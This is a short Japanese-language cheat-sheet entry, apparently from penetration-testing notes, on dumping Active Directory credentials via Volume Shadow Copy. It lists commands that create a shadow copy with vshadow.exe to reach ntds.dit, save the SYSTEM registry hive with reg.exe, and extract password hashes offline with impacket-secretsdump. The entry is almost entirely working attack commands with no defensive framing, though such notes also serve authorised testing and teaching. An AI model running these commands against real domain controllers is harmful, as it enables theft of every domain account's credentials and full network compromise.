### VSS (ボリュームシャドウコピー)
```sh
# vshadowを使ってndit.ditを取得可能
# ntdsから情報を取得するためにSYSTEMハイブが必要

# -nw: ライターを無効化して高速化
# -p: コピーをディスクに保存
vshadow.exe -nw -p C:

# Systemハイブを取得
reg.exe save hklm\system C:\system.bak

# 取得したntds, systemハイブを使って情報を取得
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```